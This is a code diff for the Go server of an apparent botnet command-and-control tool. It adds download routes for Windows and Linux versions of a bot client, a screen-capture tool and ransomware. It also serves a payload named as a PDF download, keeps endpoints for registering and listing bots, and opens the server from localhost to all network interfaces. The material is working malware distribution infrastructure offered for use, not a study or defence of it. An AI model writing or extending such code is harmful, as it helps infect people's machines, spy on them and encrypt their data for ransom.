@@ -16,7 +16,7 @@ import (
 
 //var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
 
-var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")
+var here, _ = os.Getwd()
 
 type bot struct {
 	Id       string `json:"bot_id"`
@@ -164,23 +164,35 @@ func statusupdater() {
 }
 
 func windowspdfserver(res http.ResponseWriter, req *http.Request) {
-	http.ServeFile(res, req, filepath.Join(srcDir, "/files/download-windows.pdf.exe"))
+	http.ServeFile(res, req, filepath.FromSlash("../files/download-windows.exe"))
 }
 
 func linuxpdfserver(res http.ResponseWriter, req *http.Request) {
-	http.ServeFile(res, req, filepath.Join(srcDir, "/files/download-linux"))
+	http.ServeFile(res, req, filepath.FromSlash("../files/download-linux"))
 }
 
-func clientserver(res http.ResponseWriter, req *http.Request) {
-	http.ServeFile(res, req, filepath.Join(srcDir, "/files/client.exe"))
+func windowsclientserver(res http.ResponseWriter, req *http.Request) {
+	http.ServeFile(res, req, filepath.FromSlash("../files/client-windows.exe"))
 }
 
-func screenserver(res http.ResponseWriter, req *http.Request) {
-	http.ServeFile(res, req, filepath.Join(srcDir, "/files/screen.exe"))
+func linuxclientserver(res http.ResponseWriter, req *http.Request) {
+	http.ServeFile(res, req, filepath.FromSlash("../files/client-linux"))
 }
 
-func ransomwareserver(res http.ResponseWriter, req *http.Request) {
-	http.ServeFile(res, req, filepath.Join(srcDir, "/files/ransomware.exe"))
+func windowsscreenserver(res http.ResponseWriter, req *http.Request) {
+	http.ServeFile(res, req, filepath.FromSlash("../files/screen-windows.exe"))
+}
+
+func linuxscreenserver(res http.ResponseWriter, req *http.Request) {
+	http.ServeFile(res, req, filepath.FromSlash("../files/screen-linux"))
+}
+
+func windowsransomwareserver(res http.ResponseWriter, req *http.Request) {
+	http.ServeFile(res, req, filepath.FromSlash("../files/ransomware-windows.exe"))
+}
+
+func linuxransomwareserver(res http.ResponseWriter, req *http.Request) {
+	http.ServeFile(res, req, filepath.FromSlash("../files/ransomware-linux"))
 }
 
 func uploadFile(res http.ResponseWriter, req *http.Request) {
@@ -218,17 +230,23 @@ func newRouter() *mux.Router {
 
 	fmt.Printf("Starting server at port 8081\n")
 
-	r.HandleFunc("/windows-pdf", windowspdfserver)
+	r.HandleFunc("/download-windows.exe", windowspdfserver)
 
-	r.HandleFunc("/linux-pdf", linuxpdfserver)
+	r.HandleFunc("/download-linux", linuxpdfserver)
 
 	r.HandleFunc("/register", register)
 
-	r.HandleFunc("/client", clientserver)
+	r.HandleFunc("/client-windows.exe", windowsclientserver)
 
-	r.HandleFunc("/screen", screenserver)
+	r.HandleFunc("/client-linux", linuxclientserver)
 
-	r.HandleFunc("/ransomware", ransomwareserver)
+	r.HandleFunc("/screen-windows.exe", windowsscreenserver)
+
+	r.HandleFunc("/screen-linux", linuxscreenserver)
+
+	r.HandleFunc("/ransomware-windows.exe", windowsransomwareserver)
+
+	r.HandleFunc("/ransomware-linux", linuxransomwareserver)
 
 	r.HandleFunc("/showbots", showbots)
 
@@ -260,7 +278,7 @@ func main() {
 	log.Println("Listening...")
 
 	go func() {
-		log.Fatal(http.ListenAndServe("localhost:8081", r))
+		log.Fatal(http.ListenAndServe(":8081", r))
 		wg.Done()
 	}()
 
